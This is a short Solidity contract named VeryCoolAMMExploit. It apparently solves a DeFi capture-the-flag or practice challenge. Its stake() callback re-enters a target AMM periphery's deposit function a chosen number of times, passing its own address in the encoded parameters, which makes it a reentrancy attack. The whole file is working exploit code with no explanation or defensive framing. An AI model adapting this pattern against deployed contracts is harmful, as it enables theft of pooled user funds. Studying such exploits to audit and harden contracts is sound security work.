//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IVeryCoolPeryphery {
    function deposit(
        address[] calldata pools,
        bytes[] calldata params,
        uint256[] calldata sendValues
    ) external payable;
}

contract VeryCoolAMMExploit {
    address private veryCoolAMM;
    address private ethPool;

    uint256 private doAgainTimes;

    function exploit(
        address _veryCoolAMM,
        address _ethPool,
        uint256 _doAgainTimes
    ) external payable {
        veryCoolAMM = _veryCoolAMM;
        ethPool = _ethPool;
        doAgainTimes = _doAgainTimes;

        _callVeryCoolAMM();
    }

    function stake() external payable {
        if (doAgainTimes > 0) {
            doAgainTimes--;
            _callVeryCoolAMM();
        }
    }

    function _callVeryCoolAMM() internal {
        address[] memory pools = new address[](1);
        pools[0] = ethPool;
        bytes[] memory paramsList = new bytes[](1);
        paramsList[0] = abi.encode(block.timestamp + 1, uint128(uint160(address(this))));
        uint256[] memory values = new uint256[](1);
        values[0] = msg.value;

        IVeryCoolPeryphery(veryCoolAMM).deposit{ value: msg.value }(pools, paramsList, values);
    }
}
